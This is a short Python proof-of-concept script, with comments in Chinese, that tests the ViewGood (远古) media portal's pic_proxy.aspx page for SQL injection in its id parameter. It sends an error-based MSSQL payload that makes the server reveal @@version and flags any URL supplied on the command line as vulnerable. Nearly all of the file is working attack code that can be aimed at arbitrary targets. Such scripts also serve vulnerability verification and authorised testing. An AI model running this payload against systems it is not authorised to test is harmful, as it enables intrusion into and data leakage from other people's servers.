#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古 pic_proxy.aspx SQL注入
referer: unknown
author: Lucifer
description: 文件 pic_proxy.aspx中,参数id存在SQL注入。
'''
import sys
import requests



class viewgood_pic_proxy_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/viewgood/webmedia/portal/pic_proxy.aspx?id=1%20and%201%3Dconvert%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29--&type=2"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tyqMicrosoft" in req.text:
                return "[+]存在远古 pic_proxy.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = viewgood_pic_proxy_sqli_BaseVerify(sys.argv[1])
    testVuln.run()